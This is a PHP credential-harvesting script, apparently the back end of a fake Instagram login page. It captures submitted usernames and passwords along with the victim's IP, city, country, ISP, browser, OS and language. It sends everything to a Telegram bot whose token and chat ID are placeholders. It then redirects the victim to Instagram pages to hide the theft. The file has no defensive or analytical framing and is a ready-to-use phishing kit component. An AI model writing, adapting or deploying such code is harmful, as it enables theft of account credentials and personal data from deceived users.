<?php

function getIpInfo($ip) {
    $apiUrl = "http://ip-api.com/json/{$ip}";
    $apiData = file_get_contents($apiUrl);
    return json_decode($apiData, true);
}

function getBrowserNameAndOs($userAgent) {
    $browser = "Unknown";
    if (preg_match('/Firefox/i', $userAgent)) {
        $browser = 'Firefox';
    } elseif (preg_match('/MSIE/i', $userAgent) || preg_match('/Trident/i', $userAgent)) {
        $browser = 'Internet Explorer';
    } elseif (preg_match('/Edge/i', $userAgent)) {
        $browser = 'Microsoft Edge';
    } elseif (preg_match('/Chrome/i', $userAgent)) {
        $browser = 'Google Chrome';
    } elseif (preg_match('/Safari/i', $userAgent)) {
        $browser = 'Safari';
    } elseif (preg_match('/Opera|OPR/i', $userAgent)) {
        $browser = 'Opera';
    }
    
    $os = "Unknown";
    if (preg_match('/linux/i', $userAgent)) {
        $os = 'Linux';
    } elseif (preg_match('/macintosh|mac os x/i', $userAgent)) {
        $os = 'MacOS';
    } elseif (preg_match('/windows|win32/i', $userAgent)) {
        $os = 'Windows';
    }
    
    return array($browser, $os);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];
        $dateTime = date('Y-m-d H:i:s');
        $ip = $_SERVER['REMOTE_ADDR'];
        $port = $_SERVER['REMOTE_PORT'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        $language = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : 'N/A';
        list($browser, $os) = getBrowserNameAndOs($userAgent);
        $ipInfo = getIpInfo($ip);
        
        $protocol = (!empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') ? "HTTPS" : "HTTP";

        $content = "🦆 | LOG DUCKETTSTONE\n\n";
        $content .= "📌 | USERNAME: $username\n";
        $content .= "🔑 | PASSWORD: $password\n";
        $content .= "🏠 | IP: " . $ipInfo['query'] . "\n🔎 | City: " . $ipInfo['city'] . "\n📍 | Region: " . $ipInfo['regionName'] . "\n🌎 | Country: " . $ipInfo['country'] . "\n📦 | ISP: " . $ipInfo['isp'] . "\n\n";
        $content .= "🔓 | USER-AGENT: $userAgent\n";
        $content .= "🌐 | BROWSER: $browser\n";
        $content .= "💻 | OPERATING SYSTEM: $os\n";
        $content .= "🚪 | PORT: $port\n";
        $content .= "🔒 | PROTOCOL: $protocol\n";
        $content .= "👥 | LANGUAGE: $language\n";
        $content .= "📆 | DATE/TIME: $dateTime\n\n";

        $botToken = 'BOT_TOKEN_HERE';
        $chatId = 'USER_ID_HERE';

        $message = urlencode($content);
        $url = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$message}";

        $response = file_get_contents($url);

        if ($response !== false) {
            header('Location: Instagram.html'); 
            exit();
        } else {
            echo "There was an error sending the data. Please try again.";
        }
    } else {
        echo "Please fill out all fields in the form.";
    }
} else {
    header('Location: https://www.instagram.com/'); 
    exit();
}
?>
